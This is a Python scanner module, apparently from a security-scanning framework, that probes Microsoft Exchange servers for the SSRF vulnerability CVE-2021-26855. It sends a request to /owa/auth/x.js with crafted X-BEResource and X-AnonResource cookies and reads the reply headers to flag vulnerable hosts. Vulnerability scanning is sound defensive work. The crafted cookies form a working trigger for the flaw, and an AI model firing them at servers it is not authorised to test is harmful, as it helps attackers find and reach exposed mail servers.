#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import socks
import time
import json
import threading
import string
import random
import sys
import os
from core.alert import *
from core.targets import target_type
from core.targets import target_to_host
from core.load_modules import load_file_path
from lib.socks_resolver.engine import getaddrinfo
from core._time import now
from core.decor import main_function, socks_proxy
from core.log import __log_into_file
import requests

from lib.payload.wordlists import useragents

def extra_requirements_dict():
    return {
        "vuln_ports": [80, 443]
    }




def msexchange_vuln(target, port, timeout_sec, log_in_file, language, time_sleep,
                   thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
    try:
        
        from core.conn import connection
        s = connection(target, port, timeout_sec, socks_proxy)

        if not s:
            return False
        else:
            if target_type(target) != "HTTP" and port == 443:
                target = 'https://' + target
            if target_type(target) != "HTTP" and port == 80:
                target = 'http://' + target
            cookies = {
                "X-AnonResource": "true",
                "X-AnonResource-Backend": "localhost/ecp/default.flt?~3",
                "X-BEResource": "localhost/owa/auth/logon.aspx?~3",
            }
            headers = {'User-agent': random.choice(useragents.useragents())}

            if target.endswith("/"):
                target = target[:-1]
            path = '/owa/auth/x.js'
            req = requests.get(target + path, cookies=cookies, verify=False,
                               headers=headers, timeout=timeout_sec)
            if req.status_code in [500, 503]:
                try:
                    header_server = req.headers['x-calculatedbetarget']
                    if 'localhost' in header_server or "NegotiateSecurityContext" in req.text:
                        return True
                    else:
                        return False
                except Exception as e:
                    return False
    except Exception as e:
        warn(messages(language, 'no_response'))
        return False


def __msexchange_vuln(target, port, timeout_sec, log_in_file, language, time_sleep,
                     thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
    if msexchange_vuln(target, port, timeout_sec, log_in_file, language, time_sleep,
                      thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
        info(messages(language, "target_vulnerable").format(target, port,
                                                            'Exchange Server SSRF Vulnerability CVE-2021-26855'))
        __log_into_file(thread_tmp_filename, 'w', '0', language)
        data = json.dumps({'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': port,
                           'TYPE': 'msexchange_cve_2021_26855_vuln',
                           'DESCRIPTION': messages(language, "vulnerable").format(
                               'Exchange Server SSRF Vulnerability CVE-2021-26855'), 'TIME': now(),
                           'CATEGORY': "vuln",
                           'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
        __log_into_file(log_in_file, 'a', data, language)
        return True
    else:
        return False

@main_function(extra_requirements_dict(), __msexchange_vuln, "msexchange_cve_2021_26855_vuln", "x-calculatedbetarget header not found")
def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep, language,
          verbose_level, socks_proxy, retries, methods_args, scan_id, scan_cmd):  # Main function
    pass